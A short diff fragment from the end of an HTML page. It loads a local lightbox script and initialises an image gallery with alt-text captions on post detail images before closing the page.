+  <script src="/js/simple-lightbox.min.js"></script><script>document.addEventListener('DOMContentLoaded', function() {new SimpleLightbox('.post-detail .simple-lightbox', {fileExt: false,captionsData:'alt'});});</script></body>
+</html>
+
